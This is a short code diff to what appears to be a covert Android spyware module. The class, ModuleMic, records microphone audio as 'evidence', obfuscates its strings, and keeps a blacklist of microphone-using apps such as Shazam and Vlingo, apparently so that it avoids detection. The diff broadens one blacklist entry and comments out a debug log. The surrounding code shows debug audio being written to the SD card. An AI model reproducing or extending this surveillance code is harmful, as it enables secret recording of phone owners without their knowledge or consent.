@@ -91,7 +91,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	public synchronized void resetBlacklist() {
 		blacklist.clear();
 		addBlacklist(M.e("shazam"));
-		addBlacklist(M.e("com.vlingo.midas"));
+		addBlacklist(M.e("com.vlingo"));
 		addBlacklist(M.e("com.android.soundrecorder"));
 	}
 
@@ -316,9 +316,9 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 					file.write(data);
 				}
 			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveRecorderEvidence): plain chunk, no bias");
-				}
+				//if (Cfg.DEBUG) {
+				//	Check.log(TAG + " (saveRecorderEvidence): plain chunk, no bias");
+				//}
 				data = chunk;
 				if (Cfg.MICFILE) {
 					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
